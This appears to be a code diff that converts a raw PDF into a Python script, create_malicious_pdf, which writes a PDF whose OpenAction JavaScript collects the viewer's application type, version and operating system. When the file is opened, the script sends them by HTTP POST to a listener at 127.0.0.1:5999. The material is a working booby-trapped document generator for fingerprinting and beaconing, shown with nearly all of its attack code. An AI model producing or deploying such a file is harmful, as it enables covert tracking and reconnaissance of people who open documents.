@@ -1,10 +1,11 @@
-%PDF-1.5
+def create_malicious_pdf(output_filename):
+    pdf_code = f"""%PDF-1.5
 1 0 obj
 <<
     /Type /Catalog
     /Pages 2 0 R
     /OpenAction << /S /JavaScript /JS (
-        var info = 'User-Agent: ' + app.viewerType + ' ' + app.viewerVersion + '\nOS: ' + platformName; 
+        var info = 'User-Agent: ' + app.viewerType + ' ' + app.viewerVersion + '\\nOS: ' + platformName; 
         var req = new Net.HTTP();
         req.open("POST", "http://127.0.0.1:5999", false);
         req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
@@ -50,4 +51,12 @@ trailer
 >>
 startxref
 311
-%%EOF
+%%EOF"""
+
+    with open(output_filename, "wb") as f:
+        f.write(pdf_code.encode("utf-8"))
+
+    print(f"PDF '{output_filename}' généré avec succès.")
+
+if __name__ == "__main__":
+    create_malicious_pdf("requested.pdf")
